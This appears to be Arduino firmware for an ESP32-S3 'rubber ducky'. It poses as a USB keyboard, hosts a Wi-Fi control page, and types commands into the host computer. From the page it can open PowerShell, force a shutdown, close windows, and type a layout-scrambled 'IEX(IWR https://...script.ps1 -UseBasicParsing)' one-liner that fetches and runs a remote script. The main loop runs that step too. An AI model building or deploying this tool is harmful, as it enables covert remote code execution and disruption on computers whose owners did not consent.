#include "USB.h"
#include "USBHIDKeyboard.h"
#include <WiFi.h>
#include <WebServer.h>

USBHIDKeyboard Keyboard;

const char* ssid = "ESP32S3_DUCKY";
const char* password = "Maikokow";
WebServer server(80);

/*  SPECIAL KEY MAPPING
    KEY_RETURN    - ENTER
    KEY_BACKSPACE - BACKSPACE
    KEY_ESC       - ESCAPE
    KEY_LEFT_CTRL - CTRL
    KEY_LEFT_SHIFT- SHIFT
    KEY_LEFT_ALT  - ALT
    KEY_TAB       - TAB
    KEY_LEFT_GUI  - WINDOWS/MAC
    Keyboard.releaseAll(); Relache les touches CTRL SHIFT ALT GUI
*/

volatile bool continue_program = false;

// ===== Web Page =====
const char webpage[] PROGMEM = R"rawliteral(
<!DOCTYPE html>
<html>
<head>
  <title>ESP32 Control</title>
  
  <style>
    * {
      margin: 0;
    }

    #retour {
      font-family: 'Courier New', Courier, monospace;
      font-size: 4vh;
    }

    #button {
      gap: 20px;
      display: flex;
      flex-direction: column;
    }
    
    #user_control {
      width: 90vw;
      display: flex;
      justify-content: center;
      gap: 0;
    }

    #user_control input{
      width: 100%;
      height:7vh;
      font-size: 3vh;
      padding: 0;
      margin: 0;
    }

    #user_control button {
      width: 25vw;
      height: auto;
      font-size: 3vh;
    }

    button {
      width: 90vw;
      height: 7vh;
      font-size: 3vh;
    }

    body {
      height: 100vh;
      display: flex;
      align-items: center;
      flex-direction: column;
      justify-content: center;
    }
  </style>

</head>
<body>
  
  <h1 id="retour">Program Paused</h1>
  <br>
  <div id="button">
    <div id="user_control">
      <input type="text" id="text_input" value=""/>
      <button onclick="user_type()">TYPE</button>
    </div>
    <button onclick="resume()">Continuer</button>
    <button onclick="press_enter()">Press ENTER</button>
    <button onclick="open_pwsh()">Open POWERSHELL</button>
    <button onclick="run_script()">Run Script.ps1</button>
    <button onclick="type_script()">Type Script.ps1</button>
    <button onclick="alt_f4()">ALT F4</button>
    <button onclick="shutdown()">SHUTDOWN</button>
  </div>
  </div>

  <script>
    function resume() {
      fetch('/continue')
        .then(() => {document.getElementById("retour").textContent="CONTINUING"});
    }
    function press_enter() {
      fetch('/enter')
        .then(() => {document.getElementById("retour").textContent="ENTER PRESSED"});
    }
    function open_pwsh() {
      fetch('/open_pwsh')
        .then(() => {document.getElementById("retour").textContent="POWERSHELL OPENED"});
    }
    function run_script() {
      fetch('/script')
        .then(() => {document.getElementById("retour").textContent="Script.ps1 RUN"});
    }
        function shutdown() {
      fetch('/shutdown')
        .then(() => {document.getElementById("retour").textContent="SHUTDOWN"});
    }
    function type_script() {
      fetch('/type_script')
        .then(() => {document.getElementById("retour").textContent="Wrote Sript.ps1"});
    }

    function user_type() {
    const text = document.getElementById("text_input").value;
    fetch('/type?text=' + encodeURIComponent(text))
      .then(() => {
        document.getElementById("retour").textContent = "TYPED: " + text;
      });
  }

    function alt_f4() {
      fetch('/altf4')
        .then(() => {document.getElementById("retour").textContent="ALT F4 RUN"});
    }
  </script>

</body>
</html>
)rawliteral";

// ===== Handlers =====
void root_page() {
  server.send_P(200, "text/html", webpage);
}

void continue_page() {
  continue_program = true;
  server.send(200, "text/plain", "OK");
}

void press_enter_page() {
  Keyboard.press(KEY_RETURN);
  Keyboard.releaseAll();

  server.send(200, "text/plain", "OK");
  wait_for_web();
}

void open_pwsh_page() {
  Keyboard.press(KEY_LEFT_GUI);
  Keyboard.press('r');
  Keyboard.releaseAll();
  delay(200);
  Keyboard.print("pozershell");
  delay(200);
  Keyboard.press(KEY_RETURN);
  Keyboard.releaseAll();

  server.send(200, "text/plain", "OK");
  wait_for_web();
}

void type_page() {
  if (server.hasArg("text")) {
    String text = server.arg("text");

    Keyboard.print(text);   // types the received text
  }

  server.send(200, "text/plain", "OK");
  wait_for_web();
}

void type_script_page() {
  Keyboard.print("IEX5IZR https.>>zebdqv<;qikotourre<be>zebdqv>script<ps! =UseBqsicPqrsing-");

  server.send(200, "text/plain", "OK");
  wait_for_web();
}

void shutdown_page() {
  Keyboard.press(KEY_LEFT_GUI);
  Keyboard.press('r');
  Keyboard.releaseAll();
  delay(200);
  Keyboard.print("shutdozn =s =t )");
  delay(200);
  Keyboard.press(KEY_RETURN);
  Keyboard.releaseAll();

  server.send(200, "text/plain", "OK");
  wait_for_web();
}

void run_script_page() {
  Keyboard.press(KEY_LEFT_GUI);
  Keyboard.press('r');
  Keyboard.releaseAll();

  delay(200);
  Keyboard.print("pozershell");
  delay(200);
  Keyboard.press(KEY_RETURN);
  Keyboard.releaseAll();

  delay(5000);

  Keyboard.print("IEX5IZR https.>>zebdqv<;qikotourre<be>zebdqv>script<ps! =UseBqsicPqrsing-");
  Keyboard.press(KEY_RETURN);
  Keyboard.releaseAll();

  server.send(200, "text/plain", "OK");
}

void altf4_page() {
  Keyboard.press(KEY_LEFT_ALT);
  Keyboard.press(KEY_F4);
  delay(100);
  Keyboard.releaseAll();

  server.send(200, "text/plain", "OK");
  wait_for_web();
}

// ===== Setup AP =====
void setup() {
  Serial.begin(115200);

  WiFi.softAP(ssid, password);

  Serial.println("Access Point Started");
  Serial.print("IP address: ");
  Serial.println(WiFi.softAPIP());

  server.on("/", root_page);
  server.on("/continue", continue_page);
  server.on("/enter", press_enter_page);
  server.on("/open_pwsh", open_pwsh_page);
  server.on("/type", type_page);
  server.on("/script", run_script_page);
  server.on("/type_script", type_script_page);
  server.on("/shutdown", shutdown_page);
  server.on("/altf4", altf4_page);
  server.begin();

  USB.begin();
  Keyboard.begin();
}

// ===== Pause function =====
void wait_for_web() {
  continue_program = false;

  Serial.println("Waiting for button...");

  while (!continue_program) {
    server.handleClient();
    delay(10);
  }

  Serial.println("Resumed!");
}

// ===== Main loop =====
void loop() { 
  server.handleClient();
  wait_for_web();

  //Keyboard.print("abcdefghijklmnopqrstuvwxyz&'(§!)-$^*0123456789/+>\<?,.}{[]=_#@$~");
  //From be layout  qbcdefghijkl,noparstuvzxyw7ù9 10)468à&é"'(§è!ç =_/.+;:*¨^$-°324³

  Keyboard.press(KEY_LEFT_GUI);
  Keyboard.press('r');
  Keyboard.releaseAll();

  delay(200);
  Keyboard.print("pozershell"); 
  delay(200);
  Keyboard.press(KEY_RETURN);
  Keyboard.releaseAll();

  wait_for_web();

  Keyboard.print("IEX5IZR https.>>zebdqv<;qikotourre<be>zebdqv>script<ps! =UseBqsicPqrsing-");
  Keyboard.press(KEY_RETURN);
  Keyboard.releaseAll();

}
